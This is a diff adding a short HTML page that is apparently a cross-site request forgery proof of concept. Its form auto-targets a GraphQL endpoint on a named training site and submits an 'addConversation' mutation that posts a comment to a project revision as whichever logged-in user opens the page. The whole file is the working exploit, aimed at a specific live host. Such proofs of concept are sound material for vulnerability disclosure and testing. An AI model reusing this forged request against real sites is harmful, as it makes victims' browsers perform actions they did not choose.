@@ -1,0 +1,13 @@
+<html>
+   <form enctype="application/x-www-form-urlencoded" method="POST" action="https://tctraining.dnv.com/awc/graphql">
+      <table>
+         <tr>
+            <td>query</td>
+            <td><input type="text" value="mutation addConversation($addConversationInput: AddOrUpdateConversationInput!) { addConversation(addConversationInput: $addConversationInput) { createdOrUpdatedConversation { uid type } } }" name="query"></td>
+            <td>variables</td>
+            <td><input type="text" value="{&quot;addConversationInput&quot;:{&quot;sourceObjects&quot;:[{&quot;uid&quot;:&quot;oTDAq9cvYzy6xB&quot;,&quot;type&quot;:&quot;AP4_ProjectRevision&quot;}],&quot;listOfParticipants&quot;:[],&quot;defaultCommentText&quot;:&quot;&lt;p&gt;this comment from github crsf PoC&lt;/p&gt;&quot;,&quot;conversation&quot;:{&quot;type&quot;:&quot;Ac0Conversation&quot;,&quot;uid&quot;:&quot;AAAAAAAAAAAAAA&quot;},&quot;convPrivate&quot;:false,&quot;convActionable&quot;:false,&quot;status&quot;:null,&quot;priority&quot;:null,&quot;closingUserId&quot;:null,&quot;dateClosed&quot;:null}}" name="variables"></td>
+         </tr>
+      </table>
+      <input type="submit" value="https://tctraining.dnv.com/awc/graphql">
+   </form>
+</html>
